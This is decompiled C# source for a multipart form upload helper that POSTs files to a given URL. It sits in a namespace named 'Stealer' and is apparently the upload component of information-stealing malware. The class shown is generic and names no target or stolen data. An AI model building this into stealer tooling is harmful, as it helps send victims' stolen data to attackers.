using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

namespace Stealer
{
	// Token: 0x02000015 RID: 21
	public static class FormUpload
	{
		// Token: 0x06000053 RID: 83 RVA: 0x00004E94 File Offset: 0x00003094
		public static HttpWebResponse MultipartFormDataPost(string postUrl, string userAgent, Dictionary<string, object> postParameters)
		{
			string text = string.Format("----------{0:N}", Guid.NewGuid());
			string contentType = "multipart/form-data; boundary=" + text;
			byte[] multipartFormData = FormUpload.GetMultipartFormData(postParameters, text);
			return FormUpload.PostForm(postUrl, userAgent, contentType, multipartFormData);
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004ED4 File Offset: 0x000030D4
		private static HttpWebResponse PostForm(string postUrl, string userAgent, string contentType, byte[] formData)
		{
			HttpWebRequest httpWebRequest = WebRequest.Create(postUrl) as HttpWebRequest;
			if (httpWebRequest == null)
			{
				throw new NullReferenceException("request is not a http request");
			}
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = contentType;
			httpWebRequest.UserAgent = userAgent;
			httpWebRequest.CookieContainer = new CookieContainer();
			httpWebRequest.ContentLength = (long)formData.Length;
			using (Stream requestStream = httpWebRequest.GetRequestStream())
			{
				requestStream.Write(formData, 0, formData.Length);
				requestStream.Close();
			}
			return httpWebRequest.GetResponse() as HttpWebResponse;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00004F68 File Offset: 0x00003168
		private static byte[] GetMultipartFormData(Dictionary<string, object> postParameters, string boundary)
		{
			Stream stream = new MemoryStream();
			bool flag = false;
			foreach (KeyValuePair<string, object> keyValuePair in postParameters)
			{
				if (flag)
				{
					stream.Write(FormUpload.encoding.GetBytes("\r\n"), 0, FormUpload.encoding.GetByteCount("\r\n"));
				}
				flag = true;
				if (keyValuePair.Value is FormUpload.FileParameter)
				{
					FormUpload.FileParameter fileParameter = (FormUpload.FileParameter)keyValuePair.Value;
					string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\"\r\nContent-Type: {3}\r\n\r\n", new object[]
					{
						boundary,
						keyValuePair.Key,
						fileParameter.FileName ?? keyValuePair.Key,
						fileParameter.ContentType ?? "application/octet-stream"
					});
					stream.Write(FormUpload.encoding.GetBytes(s), 0, FormUpload.encoding.GetByteCount(s));
					stream.Write(fileParameter.File, 0, fileParameter.File.Length);
				}
				else
				{
					string s2 = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"\r\n\r\n{2}", boundary, keyValuePair.Key, keyValuePair.Value);
					stream.Write(FormUpload.encoding.GetBytes(s2), 0, FormUpload.encoding.GetByteCount(s2));
				}
			}
			string s3 = "\r\n--" + boundary + "--\r\n";
			stream.Write(FormUpload.encoding.GetBytes(s3), 0, FormUpload.encoding.GetByteCount(s3));
			stream.Position = 0L;
			byte[] array = new byte[stream.Length];
			stream.Read(array, 0, array.Length);
			stream.Close();
			return array;
		}

		// Token: 0x04000057 RID: 87
		private static readonly Encoding encoding = Encoding.UTF8;

		// Token: 0x02000016 RID: 22
		public class FileParameter
		{
			// Token: 0x17000001 RID: 1
			// (get) Token: 0x06000057 RID: 87 RVA: 0x0000513C File Offset: 0x0000333C
			// (set) Token: 0x06000058 RID: 88 RVA: 0x00005144 File Offset: 0x00003344
			public byte[] File { get; set; }

			// Token: 0x17000002 RID: 2
			// (get) Token: 0x06000059 RID: 89 RVA: 0x0000514D File Offset: 0x0000334D
			// (set) Token: 0x0600005A RID: 90 RVA: 0x00005155 File Offset: 0x00003355
			public string FileName { get; set; }

			// Token: 0x17000003 RID: 3
			// (get) Token: 0x0600005B RID: 91 RVA: 0x0000515E File Offset: 0x0000335E
			// (set) Token: 0x0600005C RID: 92 RVA: 0x00005166 File Offset: 0x00003366
			public string ContentType { get; set; }

			// Token: 0x0600005D RID: 93 RVA: 0x0000516F File Offset: 0x0000336F
			public FileParameter(byte[] file) : this(file, null)
			{
			}

			// Token: 0x0600005E RID: 94 RVA: 0x00005179 File Offset: 0x00003379
			public FileParameter(byte[] file, string filename) : this(file, filename, null)
			{
			}

			// Token: 0x0600005F RID: 95 RVA: 0x00005184 File Offset: 0x00003384
			public FileParameter(byte[] file, string filename, string contenttype)
			{
				this.File = file;
				this.FileName = filename;
				this.ContentType = contenttype;
			}
		}
	}
}
